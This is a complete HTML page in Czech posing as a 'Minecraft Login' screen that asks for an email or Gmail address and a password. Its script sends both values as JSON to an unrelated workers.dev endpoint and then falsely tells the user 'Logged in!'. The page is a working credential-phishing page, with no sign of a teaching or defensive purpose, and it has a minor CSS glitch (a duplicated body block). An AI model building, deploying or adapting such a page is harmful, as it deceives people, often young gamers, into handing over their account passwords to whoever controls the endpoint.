<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="UTF-8">
<title>Minecraft Login</title>

<style>
body {
margin: 0;
height: 100vh;
display: flex;
justify-content: center;
align-items: center;
font-family: Arial, sans-serif;
body {
margin: 0;
height: 100vh;
display: flex;
justify-content: center;
align-items: center;
font-family: Arial, sans-serif;

background-image: url("https://images.unsplash.com/photo-1618336753974-aae8e04506aa?auto=format&fit=crop&w=1920&q=80");
background-size: cover;
background-position: center;
background-repeat: no-repeat;
}

h2 {
color: #7CFC00;
margin-bottom: 20px;
font-family: Arial;
}

input {
width: 90%;
padding: 12px;
margin: 10px 0;
border: none;
border-radius: 8px;
font-size: 15px;
outline: none;
}

button {
width: 100%;
padding: 14px;
margin-top: 15px;
border: none;
border-radius: 10px;
cursor: pointer;
font-size: 16px;
font-weight: bold;
background: #2ecc71;
color: white;
transition: 0.2s;
}

button:hover {
transform: scale(1.03);
background: url("https://images.weserv.nl/?url=upload.wikimedia.org/wikipedia/en/5/51/Minecraft_cover.png") no-repeat center center/cover;
}
</style>
</head>

<body>

<div class="box">
<h2>Minecraft Login</h2>

<input id="email" placeholder="Minecraft / Gmail">
<input id="password" placeholder="Password" type="password">

<button onclick="sendData()">Login</button>
</div>

<script>
async function sendData() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Vyplň všechno!");
    return;
  }

  const payload = {
    email: email,
    password: password
  };

  try {
    const response = await fetch("https://minecraft-form.m9018021.workers.dev", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      alert("Logged in!");
    } else {
      alert("Error sending data.");
    }

  } catch (e) {
    alert("Request failed.");
  }
}
</script>

</body>
</html>
